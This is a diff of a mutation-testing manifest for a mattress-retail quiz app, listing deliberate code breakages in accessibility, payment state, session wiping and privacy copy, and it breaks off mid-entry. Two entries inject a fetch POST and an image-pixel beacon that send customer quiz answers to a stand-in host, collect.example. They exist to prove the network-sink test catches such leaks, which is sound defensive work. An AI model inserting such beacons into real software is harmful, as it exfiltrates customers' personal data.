@@ -75,6 +75,41 @@ const BRIEF = ["tests/sleep_brief_presentation_check.mjs"];
 // The motion suite owns the review→Sleep Brief transition paths, including
 // the reduced-motion hardening of the retained legacy fallback (Slice 2).
 const MOTION = ["tests/motion_flag_check.mjs"];
+// Quiz presentation observer (Slice 3, item 1.2): the quiz suite owns the
+// zero-icon ruling, the two-column grid cap, option order/skip/hide semantics,
+// selection and cap/exclusivity behaviour, the aria-pressed state contract,
+// the non-color and forced-colors selected cues, the focus wiring, the 44px
+// interaction floors, and the keyboard-only focus restoration.
+const QUIZ = ["tests/quiz_presentation_check.mjs"];
+// Payment Choice observer (Slice 4, item 1.5 / decision D4): the payment suite
+// owns the two-dimension state model (payExplored / payPref) and its ephemeral
+// disclosure store, the canonical collision-proof path identity, the
+// button+panel disclosures, Consider/marker/Clear, "Not right now" and its
+// handoff suppression, the exact-identity focus restoration, the two separate
+// live regions, the forced-colors geometric cue, and the adopted EN/ES copy.
+// Every Payment Choice entry below names an observer EXPLICITLY — none may fall
+// through to DEFAULT_SUITES, which observes data-error recovery and would
+// report a survivor as a pass.
+const PAY = ["tests/payment_choice_check.mjs"];
+const PAY_WITH_SESSION = PAY.concat(["tests/session_safety_check.mjs"]);
+const PAY_EMAIL = ["tests/email_gating_check.mjs"];
+const PAY_ASYNC = ["tests/session_async_check.mjs"];
+const PAY_COPY = ["tests/financing_copy_policy_check.mjs"];
+const PAY_RENDER = ["tests/financing_render_check.mjs"];
+// The validator's own self-test, the one PYTHON observer. It owns the
+// config-admission side of Payment Choice: which financing blocks are allowed
+// to exist, as distinct from what index.html does with one that does.
+const PAY_VALIDATOR = ["tools/validation.py --self-test"];
+// Trust integrity gate observer (2026-08-21): the trust suite owns the copy <->
+// engine correspondence (document sections, cited tags, the inert-tag set,
+// shipped-vs-documented help lines, banned claims), the absence of the
+// heritage rail, the privacy voice and its network-sink pin, and the
+// tier-relativity legibility. Entries that mutate a generated or documentary
+// target name it with the fifth field.
+const TRUST = ["tests/trust_integrity_check.mjs"];
+// The contrast suite joins the trust suite as observer for the legibility of
+// the three integrity lines (size floors and normal-text contrast).
+const TRUST_CONTRAST = TRUST.concat(["tests/contrast_check.mjs"]);
 
 // ---------------------------------------------------------------------------
 // THE MANIFEST. [label, find, replace] — `find` may span lines; index.html is
@@ -847,6 +882,470 @@ const MUTATIONS = [
     "      if (dfmReducedMotion()) {\n        window._sleepSignatureEntry = true;\n        window.showProfileScreen();\n        return;\n      }\n      var elements = getConsultationRevealElements();",
     "      var elements = getConsultationRevealElements();", MOTION],
 
+  // --- Slice 3: Quiz presentation -----------------------------------------
+  // Rendering: the owner ruling is ZERO option icons, configured order, the
+  // governed hide/skip semantics, and manual advance.
+  ["quiz: an option icon is rendered into the customer UI",
+    "<span class=\"opt-label\">${L(opt.label)}</span>",
+    "<span class=\"opt-icon\">${opt.icon}</span><span class=\"opt-label\">${L(opt.label)}</span>", QUIZ],
+  ["quiz: displayed option order is reversed",
+    "${displayOptions.map(opt => {", "${displayOptions.slice().reverse().map(opt => {", QUIZ],
+  ["quiz: hideIf filtering is neutralized",
+    "!opt.hideIf || answers[opt.hideIf.question] !== opt.hideIf.answer", "true", QUIZ],
+  ["quiz: selecting an option auto-advances",
+    "      renderQuestion();\n      if (restoreId) {",
+    "      renderQuestion();\n      nextQuestion();\n      if (restoreId) {", QUIZ],
+  ["quiz: the three-selection cap is removed",
+    "if (answers[qId].length >= 3) return;", "if (false) return;", QUIZ],
+  ["quiz: \"None\" stops being exclusive",
+    "if (optId === 'none') {", "if (false) {", QUIZ],
+  ["quiz: the solo path stops stamping not_applicable",
+    "answers[q.id] = 'not_applicable';", "", QUIZ],
+  ["quiz: the stable option ids are removed",
+    "                id=\"qopt-${q.id}-${opt.id}\"\n", "", QUIZ],
+
+  // Selected-state semantics and its two non-color cues.
+  ["quiz: aria-pressed is removed from the option buttons",
+    "                aria-pressed=\"${isSel ? 'true' : 'false'}\"\n", "", QUIZ],
+  ["quiz: aria-pressed is inverted",
+    "aria-pressed=\"${isSel ? 'true' : 'false'}\"",
+    "aria-pressed=\"${isSel ? 'false' : 'true'}\"", QUIZ],
+  ["quiz: the selected state loses its geometric cue (back to colour alone)",
+    "      border-width: 2px;\n      border-left-width: 6px;\n", "", QUIZ],
+  ["quiz: the resting option stops reserving the rail (selection would reflow)",
+    "      border-left: 6px solid transparent;\n", "", QUIZ],
+  ["quiz: hover borrows the selected rail (an unselected option reads as chosen)",
+    "        border-left-color: transparent;\n", "", QUIZ],
+  // Forced-colors cue (repaired: the old (0,2,0) selector lost the cascade).
+  ["quiz: the forced-colors selected cue is removed",
+    "      body:has(#questionScreen.active) .noct-quiz-option.selected[aria-pressed=\"true\"] {\n        border-width: 3px;\n        border-left-width: 6px;\n        border-color: CanvasText;\n        padding: 18px 20px 18px 17px;\n      }\n",
+    "", QUIZ],
+  ["quiz: the forced-colors selected cue loses the cascade again (specificity dropped back to (0,2,0))",
+    "      body:has(#questionScreen.active) .noct-quiz-option.selected[aria-pressed=\"true\"] {\n        border-width: 3px;",
+    "      .noct-quiz-option[aria-pressed=\"true\"] {\n        border-width: 3px;", QUIZ],
+  ["quiz: the forced RESTING boundary loses its explicit CanvasText colour (left edge falls back to the transparent base rail)",
+    "        border-width: 1px;\n        border-color: CanvasText;\n        padding: 20px 22px;",
+    "        border-width: 1px;\n        padding: 20px 22px;", QUIZ],
+  ["quiz: the forced SELECTED boundary loses its explicit CanvasText colour (falls back to the author accent-ink)",
+    "        border-left-width: 6px;\n        border-color: CanvasText;\n        padding: 18px 20px 18px 17px;",
+    "        border-left-width: 6px;\n        padding: 18px 20px 18px 17px;", QUIZ],
+  ["quiz: the forced boundary colour is swapped from a system colour to an author token",
+    "        border-color: CanvasText;\n        padding: 20px 22px;",
+    "        border-color: var(--accent-ink);\n        padding: 20px 22px;", QUIZ],
+  ["quiz: forced colors goes back to relying on a transparent rail for the resting option",
+    "      body:has(#questionScreen.active) .noct-quiz-option {\n        border-width: 1px;\n        border-color: CanvasText;\n        padding: 20px 22px;\n      }\n",
+    "", QUIZ],
+  ["quiz: the forced-colors selected padding stops compensating (text and box shift)",
+    "        padding: 18px 20px 18px 17px;", "        padding: 19px 21px 19px 17px;", QUIZ],
+  ["quiz: the narrow breakpoint loses its forced-colors geometry (wide rule wins there by order)",
+    "    @media (forced-colors: active) and (max-width: 700px) {\n      body:has(#questionScreen.active) .noct-quiz-option {\n        padding: 17px 18px;\n      }\n",
+    "    @media (forced-colors: active) and (max-width: 700px) {\n", QUIZ],
+  ["quiz: the slider loses touch-action: manipulation (CLAUDE.md interactive-element rule)",
+    "      touch-action: manipulation;\n    }\n\n    .noct-slider-track::-webkit-slider-thumb {",
+    "    }\n\n    .noct-slider-track::-webkit-slider-thumb {", QUIZ],
+
+  // Focus wiring: both halves of the shared contract.
+  ["quiz: the five Quiz/Review controls (and the trust-gate headline) are dropped from the focus rule",
+    "    .noct-profile-secondary:focus-visible,\n    .noct-quiz-headline:focus-visible,\n    .noct-quiz-option:focus-visible,\n    .noct-quiz-back:focus-visible,\n    .noct-quiz-next:focus-visible,\n    .noct-review-edit:focus-visible,\n    .noct-slider-track:focus-visible {\n      outline: 3px solid var(--focus-ring-outer);",
+    "    .noct-profile-secondary:focus-visible {\n      outline: 3px solid var(--focus-ring-outer);", QUIZ],
+  ["quiz: the five controls (and the trust-gate headline) are dropped from the forced-colors focus fallback",
+    "      .noct-profile-secondary:focus-visible,\n      .noct-quiz-headline:focus-visible,\n      .noct-quiz-option:focus-visible,\n      .noct-quiz-back:focus-visible,\n      .noct-quiz-next:focus-visible,\n      .noct-review-edit:focus-visible,\n      .noct-slider-track:focus-visible {\n        outline-color: CanvasText;",
+    "      .noct-profile-secondary:focus-visible {\n        outline-color: CanvasText;", QUIZ],
+
+  // Every required 44px interaction floor, one entry each.
+  ["quiz: the base option row drops below the 44px floor",
+    "      gap: 4px;\n      min-height: 84px;", "      gap: 4px;\n      min-height: 24px;", QUIZ],
+  ["quiz: the consultation option row drops below the 44px floor",
+    "      min-height: 88px;\n      padding: 20px 22px 20px 17px;",
+    "      min-height: 24px;\n      padding: 20px 22px 20px 17px;", QUIZ],
+  ["quiz: Back drops below the 44px floor",
+    "      padding: 8px 10px;\n      min-height: 44px;", "      padding: 8px 10px;", QUIZ],
+  ["quiz: Next drops below the 44px floor",
+    "      padding: 16px 32px;\n      font-family: var(--font-serif);",
+    "      padding: 4px 32px;\n      font-family: var(--font-serif);", QUIZ],
+  ["quiz: Review Edit drops below the 44px floor",
+    "      min-height: 44px;\n      display: inline-flex;\n      align-items: center;\n      border-radius: var(--radius);",
+    "      border-radius: var(--radius);", QUIZ],
+  ["quiz: the slider interaction band collapses below 44px",
+    "      padding: 22px 0;", "      padding: 2px 0;", QUIZ],
+  ["quiz: the slider falls back to the global border-box reset (painted line clipped to nothing)",
+    "      box-sizing: content-box;\n", "", QUIZ],
+
+  // Layout ruling and the language-switch rerenders.
+  ["quiz: cols-3 behaviour is restored for the 7- and 8-option questions",
+    "      if (n <= 3) return 'cols-1';\n      return 'cols-2';",
+    "      if (n <= 3) return 'cols-1';\n      if (n <= 6) return 'cols-2';\n      return 'cols-3';", QUIZ],
+  ["quiz: a language switch stops re-rendering the active question",
+    "      if (questionScreen && questionScreen.classList.contains('active')) {\n        window.renderQuestion();\n      }",
+    "      if (questionScreen && false) {\n        window.renderQuestion();\n      }", QUIZ],
+  ["quiz: a language switch stops re-rendering the Review rows",
+    "      if (reviewScreen && reviewScreen.classList.contains('active')) {\n        window.renderReview();\n      }",
+    "      if (reviewScreen && false) {\n        window.renderReview();\n      }", QUIZ],
+
+  // The keyboard focus repair, in both failure directions.
+  ["quiz: keyboard focus restoration is removed",
+    "      if (restoreId) {\n        var replacement = document.getElementById(restoreId);",
+    "      if (false) {\n        var replacement = document.getElementById(restoreId);", QUIZ],
+  ["quiz: focus is restored after TOUCH too (the :focus-visible guard is dropped)",
+    "            && active.matches(':focus-visible')) {", "            && true) {", QUIZ],
+  ["quiz: focus restoration drops the option-identity gate (restores whatever is focused)",
+    "        if (active && active.id === activatedId", "        if (active && active.id", QUIZ],
+  ["quiz: the option-identity gate is weakened to the question prefix (still restores a sibling option)",
+    "        if (active && active.id === activatedId",
+    "        if (active && active.id.indexOf('qopt-' + qId + '-') === 0", QUIZ],
+  ["quiz: switchLanguage stops recording the focus hint by id (option ids no longer feed the restore path)",
+    "      if (active && active.id) _langFocusHintId = active.id;",
+    "      if (false) _langFocusHintId = active.id;", QUIZ],
+
+  // ---- Trust integrity gate (2026-08-21): question-change scroll/focus ------
+  // Observed by the quiz suite's REPAIR 9 section. The defect these guard
+  // against was measured on the mounted orientation: after Next on a tall
+  // question the next headline rendered above the viewport and focus fell to
+  // BODY.
+  ["trust: a question change no longer resets the scroll position",
+    "      if (typeof window.scrollTo === 'function') window.scrollTo(0, 0);\n      screen.scrollTop = 0;",
+    "      screen.scrollTop = 0;", QUIZ],
+  ["trust: a question change no longer focuses the new headline",
+    "      var heading = document.getElementById('questionHeadline');",
+    "      var heading = null;", QUIZ],
+  ["trust: every render is treated as a question change (answer taps and language switches would steal focus)",
+    "      var questionChanged = _renderedQuestionId !== null && _renderedQuestionId !== q.id;",
+    "      var questionChanged = true;", QUIZ],
+  ["trust: showScreen stops handing the first render to the screen transition (double-handled entry)",
+    "      if (!sameScreen && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();",
+    "", QUIZ],
+  ["trust: the question headline becomes a permanent tab stop",
+    'id="questionHeadline" tabindex="-1"', 'id="questionHeadline" tabindex="0"', QUIZ],
+  ["trust: the question-change repair ignores the shared refusal gate",
+    "      if (typeof screenTransitionOwnedElsewhere === 'function' && screenTransitionOwnedElsewhere()) return;\n      var screen = document.getElementById('questionScreen');",
+    "      var screen = document.getElementById('questionScreen');", QUIZ],
+  ["trust: showScreen hands the first render to the screen only on Review transitions (a new customer's first question is double-handled)",
+    "      if (!sameScreen && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();",
+    "      if (!sameScreen && id === 'reviewScreen' && typeof noteQuestionScreenEntered === 'function') noteQuestionScreenEntered();", QUIZ],
+  ["trust: the rendered-question record freezes at the first question (every later answer tap becomes a change)",
+    "      _renderedQuestionId = q.id;", "      if (_renderedQuestionId === null) _renderedQuestionId = q.id;", QUIZ],
+  ["trust: the question-change repair stops checking that the question screen is the active screen",
+    "      if (!screen || !screen.classList || !screen.classList.contains('active')) return;", "", QUIZ],
+  ["trust: the question-change repair stops honouring isFocusRestorable()",
+    "      if (typeof isFocusRestorable === 'function' && !isFocusRestorable(heading)) return;", "", QUIZ],
+
+  // ---- Trust integrity gate (2026-08-21): copy <-> engine correspondence --
+  ["trust: a shipped overclaim returns to a help line (\"easy fix\")",
+    '"en": "If you sleep hot, we favor cooling features in your matches."',
+    '"en": "Sleeping hot or cold is an easy fix with the right materials."', TRUST, "data/quiz.json"],
+  ["trust: a help line drifts from the line the correspondence document records",
+    '"en": "This helps us favor pressure relief, support, or a responsive feel."',
+    '"en": "This helps us favor pressure relief, support, or a responsive feel, and more."', TRUST, "data/quiz.json"],
+  ["trust: a question loses its correspondence section",
+    "### 2. mattress_size", "### 2. mattress_sizes", TRUST, "docs/quiz-copy-engine-correspondence.md"],
+  ["trust: the documented inert-tag set drifts from the shipped catalog",
+    "`Inert tags: adjustable, comfort,", "`Inert tags: comfort,", TRUST, "docs/quiz-copy-engine-correspondence.md"],
+  ["trust: the document cites a mechanism the question does not score",
+    "- **Cited tags:** cooling, hybrid, memory, plush.", "- **Cited tags:** cooling, hybrid, memory, plush, motionIsolation.",
+    TRUST, "docs/quiz-copy-engine-correspondence.md"],
+  ["trust: the quiz root contract is widened for retailer prose",
+    '{\n  "questions": [', '{\n  "trustStories": [],\n  "questions": [', TRUST, "data/quiz.json"],
+
+  // ---- Trust integrity gate (2026-08-21): privacy voice ---------------------
+  // ---- Trust gate, owner ruling R5 (2026-08-21): the idle dialog body --------
+  // Observed by the session suite, which opens the dialog through the real
+  // controller on a fake clock and pins the RENDERED body in both languages.
+  ["trust: the idle dialog body reverts to the privacy reassurance (EN)",
+    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",',
+    '"safety.timeout_body": "Your session is paused to protect your privacy.",', WITH_SESSION, "data/dict-en.json"],
+  ["trust: the idle dialog body stops naming the real controls (EN)",
+    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",',
+    '"safety.timeout_body": "Session paused. Continue where you left off, or restart to clear this session.",', WITH_SESSION, "data/dict-en.json"],
+  ["trust: the Spanish idle dialog body silently becomes English",
+    '"safety.timeout_body": "Sesión en pausa. Sigue en esta sesión donde la dejaste o empieza con otro cliente para borrarla.",',
+    '"safety.timeout_body": "Session paused. Continue this session where you left off, or start a new customer to clear it.",', WITH_SESSION, "data/dict-es.json"],
+  ["trust: the idle dialog body becomes a hardcoded literal in index.html",
+    "      setSafetyText('sessionSafetyBody', t(cfg.bodyKey));",
+    "      setSafetyText('sessionSafetyBody', _safetyMode === 'timeout' ? 'Session paused. Continue this session where you left off, or start a new customer to clear it.' : t(cfg.bodyKey));", WITH_SESSION],
+  // Anchored on the four ids alone (not on their position in the array), so the
+  // entry still applies after Slice 5 appends its own ids to the inventory.
+  ["trust: the Sleep System containers leave the wipe inventory (a previous customer's prose survives Restart)",
+    "'sleepSystemMain', 'sleepSystemGuidance', 'sleepSystemRail', 'sleepSystemPlanList'",
+    "", TRUST.concat(["tests/session_safety_check.mjs"])],
+  ["trust: the drawer's answer-derived text leaves the wipe inventory",
+    "'drawerShortlistFit', 'drawerSystemPromptTitle', 'drawerSystemPromptReason',", "", TRUST.concat(["tests/session_safety_check.mjs"])],
+  ["trust: the Welcome renderer stops calling the data-use renderer (the line never renders)",
+    "      renderDataUseStatement();", "      if (false) renderDataUseStatement();", TRUST],
+  ["trust: the welcome data-use line ignores deployment mode (always the preview sentence)",
+    "      var key = emailDeliveryLive() ? 'privacy.data_use_live' : 'privacy.data_use_preview';",
+    "      var key = 'privacy.data_use_preview';", TRUST],
+  ["trust: a missing data-use variant renders the dictionary KEY instead of nothing",
+    "      if (typeof text === 'string' && text.trim() && text !== key) {",
+    "      if (typeof text === 'string') {", TRUST],
+  ["trust: the shared mode helper ignores a scenario that disables submission",
+    "      return !!gasUrl && !scenarioBlocksEmail;", "      return !!gasUrl;", TRUST],
+  ["trust: the email screen's preview note stops deriving from the shared mode helper",
+    "      var isDemoMode = !emailDeliveryLive();", "      var isDemoMode = false;", TRUST],
+  ["trust: the retired template promise returns to the email screen",
+    "      setText('emailPrivacyLead', localizedConfigBlock('text').emailPrivacy || '');",
+    "      setText('emailPrivacyLead', (localizedConfigBlock('text').emailPrivacy || '') + ' Your info is never sold to third parties. Unsubscribe anytime.');",
+    TRUST],
+  ["trust: the privacy-overlay fallback promise returns to the template",
+    '<span data-store="privacy-body"></span>',
+    '<span data-store="privacy-body">Your information is never sold or shared with third parties.</span>', TRUST],
+  ["trust: the Review line reverts to the inline claim that the specialist builds the matches",
+    "      if (help) help.textContent = t('review.help');",
+    "      if (help) help.textContent = 'A quick check, then your specialist builds your recommendations.';", TRUST],
+  ["trust: a third network sink appears (a beacon carrying the answers)",
+    "        answers[qId] = optId;\n      }\n      renderQuestion();",
+    "        answers[qId] = optId;\n      }\n      fetch ('https://collect.example/a', { method: 'POST', body: JSON.stringify(answers) });\n      renderQuestion();", TRUST],
+  ["trust: a pixel beacon carries the answers to an external host",
+    "        answers[qId] = optId;\n      }\n      renderQuestion();",
+    "        answers[qId] = optId;\n      }\n      document.createElement('img').src = 'https://collect.example/p?a=' + encodeURIComponent(JSON.stringify(answers));\n      renderQuestion();", TRUST],
+  ["trust: the Spanish data-use variant silently becomes English",
+    '"privacy.data_use_preview": "Durante esta sesión en la tienda,',
+    '"privacy.data_use_preview": "During this showroom session,', TRUST, "data/dict-es.json"],
+  ["trust: the validator stops rejecting preview-mode privacy prose under a live gasUrl",
+    "    if live_at_runtime:\n        _check_privacy_prose_mode(r, config)",
+    "    if False:\n        _check_privacy_prose_mode(r, config)", PAY_VALIDATOR, "tools/validation.py"],
+  ["trust: the validator accepts a non-blank placeholder gasUrl again (live at runtime, pointing at a sentinel)",
+    "    if live_at_runtime and is_placeholder:",
+    "    if False:", PAY_VALIDATOR, "tools/validation.py"],
+
+  // ---- Trust integrity gate (2026-08-21): legibility of the honest lines ---
+  ["trust: the tier-relativity note shrinks back below body size",
+    "      margin-top: 8px;\n      font-size: 15px;\n      line-height: 1.45;",
+    "      margin-top: 8px;\n      font-size: 11px;\n      line-height: 1.45;", TRUST_CONTRAST],
+  ["trust: the welcome data-use sentence shrinks below body size",
+    "    .landing-data-use {\n      font-family: var(--font-sans);\n      font-size: 16px;",
+    "    .landing-data-use {\n      font-family: var(--font-sans);\n      font-size: 12px;", TRUST_CONTRAST],
+  ["trust: the tier-relativity note drops to a low-contrast ink",
+    "      font-size: 15px;\n      line-height: 1.45;\n      color: var(--color-text-muted);",
+    "      font-size: 15px;\n      line-height: 1.45;\n      color: var(--color-text-subtle);", TRUST_CONTRAST],
+
+  // ---- Slice 4 / D4: the Payment Choice state model ------------------------
+  // The two dimensions, and the line between them. Exploration is descriptive
+  // history; a preference is a deliberate one-way choice. Each mutation below
+  // collapses one of those properties.
+  ["payment: exploring a path also sets it as the preference",
+    "        payOpen[id] = true;\n        payRecordExplored(id);",
+    "        payOpen[id] = true;\n        payRecordExplored(id);\n        payPref = id;", PAY],
+  ["payment: opening the whole sheet records every path as explored",
+    "      sheet.hidden = false;\n      // Deliberately records NOTHING.",
+    "      sheet.hidden = false;\n      finPaymentPaths().forEach(function(p) { payRecordExplored(p.id); });\n      // Deliberately records NOTHING.", PAY],
+  ["payment: explored history admits duplicates",
+    "      if (!payIsExplored(id)) payExplored.push(id);",
+    "      payExplored.push(id);", PAY],
+  ["payment: explored history reorders to most-recent-first",
+    "      if (!payIsExplored(id)) payExplored.push(id);",
+    "      payExplored = [id].concat(payExplored.filter(function(x) { return x !== id; }));", PAY],
+  ["payment: hiding a disclosure deletes the explored entry",
+    "      if (payOpen[id] === true) {\n        delete payOpen[id];",
+    "      if (payOpen[id] === true) {\n        delete payOpen[id];\n        payExplored = payExplored.filter(function(x) { return x !== id; });", PAY],
+  ["payment: Consider becomes a toggle and unsets itself",
+    "      if (payPref === id) return;                  // idempotent, never a toggle",
+    "      if (payPref === id) { payPref = null; renderAllFinancingSurfaces(); return; }", PAY],
+  ["payment: Clear accepts a path that is not the current preference",
+    "      if (payPref !== id) return;",
+    "      if (false) return;", PAY],
+  ["payment: Clear erases the explored history",
+    "      payPref = null;\n      renderAllFinancingSurfaces();\n      if (keepFocus) payRestoreFocus(finPathDom('finPathConsider', id));",
+    "      payPref = null;\n      payExplored = [];\n      renderAllFinancingSurfaces();\n      if (keepFocus) payRestoreFocus(finPathDom('finPathConsider', id));", PAY],
+  ["payment: Not right now erases the explored history instead of preserving it",
+    "      payPref = turningOn ? PAY_NOT_NOW : null;",
+    "      payPref = turningOn ? PAY_NOT_NOW : null;\n      if (turningOn) payExplored = [];", PAY],
+  ["payment: Not right now stops suppressing the explored row on the handoff",
+    "      var exploredLabels = notNow ? [] : payExplored",
+    "      var exploredLabels = payExplored", PAY],
+  ["payment: the current preference is listed again as merely explored",
+    "        .filter(function(id) { return id !== payPref; })",
+    "        .filter(function(id) { return id !== null; })", PAY],
+  ["payment: an unknown/stale path id renders as a raw token",
+    "        return '';        // unknown/stale id: NEVER rendered, never as a raw id",
+    "        return id;", PAY],
+  ["payment: Consider stops validating the path id (an unknown id writes state)",
+    "      if (!finPathById(id)) return;\n      if (payPref === id) return;",
+    "      if (payPref === id) return;", PAY],
+
+  // Identity. The retired slugifier collapsed distinct provider/plan values
+  // onto one key and produced colon-bearing DOM ids.
+  ["payment: path identity falls back to the lossy slugifier (distinct paths collide)",
+    "      var esc;",
+    "      return String(value == null ? '' : value).trim().toLowerCase().replace(/[^a-z0-9_-]+/g, '-').replace(/^-+|-+$/g, '');\n      var esc;", PAY],
+  ["payment: path ids regain a colon separator (unusable in querySelector/CSS)",
+    "      return kind + '-' + enc;",
+    "      return kind + ':' + enc;", PAY],
+  // The unencodable-value guard. An unpaired surrogate makes
+  // encodeURIComponent throw, and the throw used to escape three guarded entry
+  // points: it blanked the handoff module after it was already visible, killed
+  // the sheet CTA after its own guard, and halted a language switch mid-way.
+  ["payment: the unencodable-string guard is removed (a lone surrogate throws through the renderers)",
+    "      var esc;\n      try {\n        esc = encodeURIComponent(value);\n      } catch (err) {\n        return null;\n      }",
+    "      var esc = encodeURIComponent(value);", PAY],
+  // THE COERCION. Restoring String() here reintroduces the defect an
+  // external review found: JSON.parse('{"toString": null}') is a plain
+  // object whose own toString is not callable, String() on it throws
+  // TypeError, and the throw escapes the handoff renderer, the sheet opener
+  // and the language switch.
+  ["payment: identity values are coerced again instead of being required to be strings",
+    "      if (value === null || value === undefined) return '';\n      if (typeof value !== 'string') return null;",
+    "      value = String(value == null ? '' : value);", PAY],
+  // The empty encoding is an identity only for the promotional group.
+  // Dropping the kind restriction lets a plan with a null or blank id
+  // become the truthy stub "plan-", which then survives filtering,
+  // resolves, emits controls and can be stored as payPref.
+  ["payment: an empty identity is accepted for every kind again (the stub plan- returns)",
+    "      if (enc === '' && kind !== 'promo') return '';",
+    "", PAY],
+  ["payment: finPathId re-derives the coercion outside the encoder (the second String() returns)",
+    "      if (enc === null) return '';",
+    "      if (!enc && String(value == null ? '' : value) !== '') return '';", PAY],
+  // The two action regions share one announcement slot. Every transition must
+  // cancel the prior pending utterance across regions, not merely within its own.
+  // C8 reverted a per-region timer that had exactly this effect: the cancel
+  // became same-region-only, so a transition on one surface left the other
+  // surface's now-false message pending and a screen reader announced a payment
+  // position the customer had already left.
+  ["payment: the announcement cancel becomes same-region-only (a stale message survives elsewhere)",
+    "      if (_payAnnounceTimer !== null) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }\n      if (!payRegionLive(regionId)) return;",
+    "      if (_payAnnounceTimer !== null && window._payAnnounceRegion === regionId) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }\n      window._payAnnounceRegion = regionId;\n      if (!payRegionLive(regionId)) return;", PAY],
+  ["payment: the liveness test runs BEFORE the cancel, so a dark region cannot supersede a stale message",
+    "      if (_payAnnounceTimer !== null) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }\n      if (!payRegionLive(regionId)) return;",
+    "      if (!payRegionLive(regionId)) return;\n      if (_payAnnounceTimer !== null) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }", PAY],
+
+  // Accessibility of the new controls.
+  ["payment: the disclosure loses aria-expanded",
+    "        + 'aria-expanded=\"' + (open ? 'true' : 'false') + '\" '",
+    "        + ''", PAY],
+  ["payment: the disclosure loses aria-controls",
+    "        + 'aria-controls=\"' + finEsc(panelId) + '\" '",
+    "        + ''", PAY],
+  ["payment: Consider claims to be a two-state control (gains aria-pressed)",
+    "        html += '<button type=\"button\" class=\"fin-btn fin-btn-secondary fin-path-consider\"",
+    "        html += '<button type=\"button\" aria-pressed=\"false\" class=\"fin-btn fin-btn-secondary fin-path-consider\"", PAY],
+  ["payment: the considering marker becomes an interactive control",
+    "        html += '<span class=\"fin-path-marker\" id=\"'",
+    "        html += '<button type=\"button\" class=\"fin-path-marker\" id=\"'", PAY],
+  ["payment: \"Not right now\" loses aria-pressed (its one genuine two-state control)",
+    "        + 'aria-pressed=\"' + (notNow ? 'true' : 'false') + '\" '",
+    "        + ''", PAY],
+  ["payment: the new controls lose the .fin-btn interaction floor (48px + touch-action)",
+    "class=\"fin-btn fin-btn-ghost fin-path-review\"",
+    "class=\"fin-path-review\"", PAY],
+  ["payment: a path control drops its ontouchend preventDefault (iPad ghost clicks)",
+    "'ontouchend=\"event.preventDefault();window.considerPaymentPath(this.getAttribute(\\'data-path-id\\'));\">'",
+    "'ontouchend=\"window.considerPaymentPath(this.getAttribute(\\'data-path-id\\'));\">'", PAY],
+
+  // Focus restoration, in both failure directions.
+  ["payment: focus restoration drops the control-identity gate",
+    "        return !!(active && active.id === controlId",
+    "        return !!(active && active.id", PAY],
+  ["payment: focus is restored after TOUCH too (the :focus-visible guard is dropped)",
+    "          && active.matches(':focus-visible'));",
+    "          && true);", PAY],
+
+  // The two live regions must stay two.
+  ["payment: Consider/Clear announce through the freshness region instead",
+    "      announcePayAction('financingSheetAction', 'currentlyConsidering');",
+    "      announcePayAction('financingSheetStatus', 'currentlyConsidering');", PAY],
+  ["payment: a queued announcement is no longer superseded (two utterances race)",
+    "      if (_payAnnounceTimer !== null) {\n        clearTimeout(_payAnnounceTimer);\n        _payAnnounceTimer = null;\n      }\n      if (!payRegionLive(regionId)) return;\n      region.textContent = '';",
+    "      region.textContent = '';", PAY_ASYNC],
+
+  // Forced colors: the cue must WIN the cascade and must be geometry.
+  ["payment: the forced-colors pressed rule stops pinning an explicit system colour",
+    "      .fin-handoff__interest .fin-not-now[aria-pressed=\"true\"] {\n        border-width: 2px;\n        border-color: CanvasText;",
+    "      .fin-handoff__interest .fin-not-now[aria-pressed=\"true\"] {\n        border-width: 2px;\n        border-color: #211E19;", PAY],
+  ["payment: the forced-colors pressed rule loses its cascade scope (drops to a losing selector)",
+    "      .fin-handoff__interest .fin-not-now[aria-pressed=\"true\"] {",
+    "      .fin-not-now {", PAY],
+  ["payment: the considering marker's geometric cue collapses to the resting width",
+    "      .fin-card .fin-path-marker {\n        border-width: 2px;",
+    "      .fin-card .fin-path-marker {\n        border-width: 1px;", PAY],
+  ["payment: the resting path controls lose their explicit system boundary",
+    "      .fin-card .fin-path-review,\n      .fin-card .fin-path-consider,\n      .fin-card .fin-path-clear {\n        border-color: CanvasText;",
+    "      .fin-card .fin-path-review,\n      .fin-card .fin-path-consider,\n      .fin-card .fin-path-clear {\n        border-color: #C9C1AF;", PAY],
+
+  // Session + language.
+  ["payment: a language switch resets the model instead of only the announcements",
+    "      clearPayAnnouncements();\n      renderAllFinancingSurfaces();",
+    "      clearPayAnnouncements();\n      payExplored = []; payPref = null; payOpen = {};\n      renderAllFinancingSurfaces();", PAY_WITH_SESSION],
+  ["payment: the wipe leaves the explored history behind",
+    "        payExplored = [];\n        payPref = null;",
+    "        payPref = null;", PAY_WITH_SESSION],
+  ["payment: the wipe leaves the preference behind",
+    "        payPref = null;\n        payOpen = {};",
+    "        payOpen = {};", PAY_WITH_SESSION],
+  ["payment: the wipe hides a missing binding behind a typeof guard",
+    "        payExplored = [];",
+    "        if (typeof payExplored !== 'undefined') payExplored = [];", PAY_WITH_SESSION],
+  ["payment: the sheet's action region drops out of the wipe's text inventory",
+    "      'hf2FinancingStatus', 'financingSheetStatus', 'financingSheetAction',",
+    "      'hf2FinancingStatus', 'financingSheetStatus',", PAY_WITH_SESSION],
+  ["payment: the customer-derived financing containers drop out of the wipe inventory",
+    "      'financingSheetCards', 'hf2FinancingInterest', 'hf2FinancingPrograms',",
+    "", PAY_WITH_SESSION],
+
+  // Privacy: email, payload, diagnostics.
+  ["payment: the email body starts reading the preference",
+    "      return FC('emailBodyAvailable');",
+    "      return payPref ? FC('emailBody') : FC('emailBodyAvailable');", PAY_EMAIL],
+  ["payment: a retired agenda diagnostic event returns",
+    "      payPref = turningOn ? PAY_NOT_NOW : null;",
+    "      payPref = turningOn ? PAY_NOT_NOW : null;\n      analytics.log('financing_agenda_changed', finEventBase('handoff'));", PAY_ASYNC],
+
+  // Copy: a retired key comes back, or an adopted one disappears.
+  ["payment: a retired agenda copy key is wired back into the renderer",
